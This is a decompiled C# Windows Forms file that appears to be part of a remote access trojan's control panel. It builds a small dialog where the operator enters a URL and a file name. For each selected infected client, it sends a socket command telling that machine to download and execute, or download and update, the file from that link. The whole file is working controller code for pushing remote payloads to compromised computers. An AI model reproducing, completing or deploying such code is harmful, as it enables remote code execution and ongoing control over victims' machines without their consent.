using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class UPCGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("URL")]
	private TextBox _URL;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("FN")]
	private TextBox _FN;

	private FrmMAINGR F1;

	internal virtual TextBox URL
	{
		[DebuggerNonUserCode]
		get
		{
			return _URL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_URL = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual TextBox FN
	{
		[DebuggerNonUserCode]
		get
		{
			return _FN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_FN = value;
		}
	}

	public UPCGR()
	{
		((Form)this).add_Load((EventHandler)updatecl_Load);
		__ENCAddToList(this);
		F1 = new FrmMAINGR();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Expected O, but got Unknown
		//IL_014d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Expected O, but got Unknown
		//IL_01e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ea: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0359: Unknown result type (might be due to invalid IL or missing references)
		//IL_0363: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(UPCGR));
		URL = new TextBox();
		Label1 = new Label();
		Button1 = new Button();
		Label2 = new Label();
		FN = new TextBox();
		((Control)this).SuspendLayout();
		((Control)URL).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox uRL = URL;
		Point location = new Point(90, 7);
		((Control)uRL).set_Location(location);
		((Control)URL).set_Name("URL");
		TextBox uRL2 = URL;
		Size size = new Size(275, 21);
		((Control)uRL2).set_Size(size);
		((Control)URL).set_TabIndex(0);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		location = new Point(7, 10);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(77, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Direct Link :");
		((Control)Button1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button button = Button1;
		location = new Point(111, 59);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(150, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Download and Update");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label3 = Label2;
		location = new Point(9, 36);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(72, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("File Name :");
		((Control)FN).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox fN = FN;
		location = new Point(90, 33);
		((Control)fN).set_Location(location);
		((Control)FN).set_Name("FN");
		TextBox fN2 = FN;
		size = new Size(275, 21);
		((Control)fN2).set_Size(size);
		((Control)FN).set_TabIndex(3);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.Control);
		size = new Size(373, 88);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)FN);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)URL);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("updatecl");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text(" ");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b7: Unknown result type (might be due to invalid IL or missing references)
		if ((Operators.CompareString(URL.get_Text(), "", false) == 0) | (Operators.CompareString(FN.get_Text(), "", false) == 0))
		{
			MessageBox.Show("Add your file Url and name than Continue !");
		}
		else
		{
			if (Operators.CompareString(URL.get_Text(), (string)null, false) == 0 || Operators.CompareString(FN.get_Text(), (string)null, false) == 0 || 1 == 0)
			{
				return;
			}
			try
			{
				if (Operators.CompareString(((Form)this).get_Text(), "Download and execute", false) == 0)
				{
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = F1.listV1.get_SelectedItems().GetEnumerator();
						while (enumerator.MoveNext())
						{
							_ = (ListViewItem)enumerator.Current;
							F1.s.Send(F1.sock, "UNV" + F1.Key + F1.URC + F1.Key + "UNI.UNI" + F1.Key + Functions.RandomVariable(5, 8) + F1.Key + "False" + F1.Key + "False" + F1.Key + "True" + F1.Key + URL.get_Text() + F1.Key + FN.get_Text() + F1.Key + "False" + F1.Key + "False" + F1.Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + F1.Key + Functions.RandomVariable(1, 5) + F1.Key + "False");
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				else
				{
					IEnumerator enumerator2 = default(IEnumerator);
					try
					{
						enumerator2 = F1.listV1.get_SelectedItems().GetEnumerator();
						while (enumerator2.MoveNext())
						{
							_ = (ListViewItem)enumerator2.Current;
							F1.s.Send(F1.sock, "UNV" + F1.Key + F1.URC + F1.Key + "UNI.UNI" + F1.Key + Functions.RandomVariable(5, 8) + F1.Key + "False" + F1.Key + "False" + F1.Key + "True" + F1.Key + URL.get_Text() + F1.Key + FN.get_Text() + F1.Key + "True" + F1.Key + "False" + F1.Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + F1.Key + Functions.RandomVariable(1, 5) + F1.Key + "False");
						}
					}
					finally
					{
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			((Form)this).Close();
		}
	}

	private void updatecl_Load(object sender, EventArgs e)
	{
		if (Operators.CompareString(((Form)this).get_Text(), "Download and execute", false) == 0)
		{
			((ButtonBase)Button1).set_Text("Download and execute");
		}
		else
		{
			((ButtonBase)Button1).set_Text("Download and update");
		}
	}
}
